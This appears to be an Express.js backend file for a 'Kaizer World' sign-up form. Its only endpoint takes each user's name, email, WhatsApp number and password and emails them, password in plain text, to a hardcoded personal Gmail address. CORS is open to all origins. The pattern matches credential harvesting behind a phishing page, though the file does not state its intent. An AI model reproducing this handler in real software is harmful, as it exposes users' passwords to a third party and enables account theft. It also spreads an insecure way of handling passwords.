const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();
app.use(cors());
app.use(express.json());

app.post("/api/send", async (req, res) => {
  const { name, email, whatsapp, password } = req.body;

  if (!name || !email || !whatsapp || !password) {
    return res.status(400).json({ message: "All fields are required!" });
  }

  try {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "YOUR_GMAIL_ACCOUNT@gmail.com",       // Replace with sender Gmail
        pass: "YOUR_GMAIL_APP_PASSWORD",            // App password
      },
    });

    const mailOptions = {
      from: `"Kaizer World" <YOUR_GMAIL_ACCOUNT@gmail.com>`,
      to: "reaganhenryssentongo@gmail.com",
      subject: "New Sign Up from Kaizer World",
      text: `Name: ${name}\nEmail: ${email}\nWhatsApp: ${whatsapp}\nPassword: ${password}`,
    };

    await transporter.sendMail(mailOptions);

    return res.status(200).json({ message: "Data sent successfully ✅" });
  } catch (err) {
    console.error("Email send error:", err);
    return res.status(500).json({ message: "Failed to send email ❌" });
  }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`Backend running on port ${PORT}`));
